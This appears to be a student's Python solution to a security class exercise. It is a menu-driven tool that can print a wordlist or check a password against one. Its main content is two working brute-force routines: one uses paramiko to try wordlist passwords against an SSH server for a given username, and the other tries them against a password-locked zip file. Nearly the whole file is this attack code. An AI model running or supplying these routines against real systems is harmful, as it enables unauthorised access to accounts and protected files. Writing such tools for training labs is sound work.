#!/usr/bin/env python3

# Script: Ops 401 Class 18 Ops Challenge Solution
# Author:Ethan Brock
# Date of latest revision: 10MAY2023
# Purpose: brute force attack
# Resources: Chatgpt 

import time
import zipfile

import paramiko


def ssh_brute_force(ip_address, username, wordlist_path):
    with open(wordlist_path) as f:
        for password in f:
            password = password.strip()
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(ip_address, username=username, password=password)
                print(f"Password found: {password}")
                ssh.close()
                return True
            except:
                print(f"Failed with password: {password}")
                ssh.close()
                continue
        print("Password not found in word list.")
        return False


def zip_brute_force(zip_file_path, wordlist_path):
    with open(wordlist_path) as f:
        for password in f:
            password = password.strip()
            try:
                with zipfile.ZipFile(zip_file_path) as zf:
                    zf.extractall(pwd=bytes(password, 'utf-8'))
                    print(f"Password found: {password}")
                    return True
            except:
                print(f"Failed with password: {password}")
                continue
        print("Password not found in word list.")
        return False


print("Select a mode:")
print("1. Offensive; Dictionary Iterator")
print("2. Defensive; Password Recognized")
print("3. SSH brute force")
print("4. Zip file brute force")

mode = int(input())

if mode == 1:
    filepath = input("Enter the file path for the word list: ")
    with open(filepath) as f:
        for word in f:
            word = word.strip()
            print(word)
            time.sleep(0.5)
elif mode == 2:
    password = input("Enter a password to search for: ")
    filepath = input("Enter the file path for the word list: ")
    with open(filepath) as f:
        if password in f.read():
            print("Password recognized!")
        else:
            print("Password not found in word list.")
elif mode == 3:
    ip_address = input("Enter the IP address of the SSH server: ")
    username = input("Enter the username for the SSH connection: ")
    wordlist_path = input("Enter the file path for the word list: ")
    ssh_brute_force(ip_address, username, wordlist_path)
elif mode == 4:
    zip_file_path = input("Enter the path to the password-locked zip file: ")
    wordlist_path = input("Enter the path to the word list file: ")
    zip_brute_force(zip_file_path, wordlist_path)
else:
    print("Invalid mode selected.")
